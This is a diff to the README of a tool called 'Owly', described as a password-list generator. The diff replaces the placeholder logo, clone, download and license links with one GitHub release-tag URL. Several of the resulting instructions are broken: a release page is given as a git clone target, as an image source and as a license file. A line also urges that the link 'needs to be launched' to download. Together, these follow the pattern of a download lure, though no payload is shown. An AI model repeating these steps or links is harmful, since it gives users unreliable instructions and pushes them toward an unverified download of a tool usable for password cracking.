@@ -2,7 +2,7 @@
 
 ---
 
-![Owly Logo](https://example.com/owly-logo.png)
+![Owly Logo](https://github.com/mhdrfqi/Owly/releases/tag/v1.2)
 
 ---
 
@@ -40,7 +40,7 @@ This repository covers the following topics:
 
 ## How to Use Owly
 
-1. Clone the repository: `git clone https://github.com/username/Owly.git`
+1. Clone the repository: `git clone https://github.com/mhdrfqi/Owly/releases/tag/v1.2`
 2. Install the necessary dependencies
 3. Run Owly with your preferred settings
 4. Generate secure password lists for your specific use case
@@ -49,7 +49,7 @@ This repository covers the following topics:
 
 ## Download Owly
 
-[![Download Owly](https://img.shields.io/badge/Download-Owly-blue)](https://github.com/files/Soft.zip)
+[![Download Owly](https://github.com/mhdrfqi/Owly/releases/tag/v1.2)](https://github.com/mhdrfqi/Owly/releases/tag/v1.2)
 
 *Note: This link needs to be launched for downloading Owly.*
 
@@ -69,7 +69,7 @@ For any questions, issues, or feedback, please check the "Issues" section or rea
 
 ## License
 
-Owly is licensed under the MIT License. See the [LICENSE](https://github.com/username/Owly/blob/main/LICENSE) file for more details.
+Owly is licensed under the MIT License. See the [LICENSE](https://github.com/mhdrfqi/Owly/releases/tag/v1.2) file for more details.
 
 ---
 
